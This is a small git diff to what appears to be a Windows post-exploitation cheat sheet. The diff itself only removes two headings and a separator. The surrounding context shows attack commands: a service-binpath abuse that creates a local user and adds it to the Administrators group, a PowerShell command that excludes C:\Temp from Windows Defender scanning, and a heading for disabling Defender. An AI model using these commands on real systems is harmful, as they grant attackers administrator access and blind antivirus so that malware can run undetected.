@@ -43,10 +43,6 @@ Add user and assign to Administrators group:
 sc config <service> binpath="cmd /c cmd.exe /c net user <username> <password> /add && net localgroup Administrators <username> /add"
 ```
 
----
-
-## Exclusion
-
 Exclude `C:\Temp` folder from Windows Defender:
 
 ```cmd
@@ -64,8 +60,6 @@ Remove `C:\Temp` folder from Windows Defender exclusion list:
 ```cmd
 powershell -Command "Remove-MpPreference -ExclusionPath 'C:\Temp'"
 ```
-
-## Windows Defender
 
 Disable Windows Defender:
 
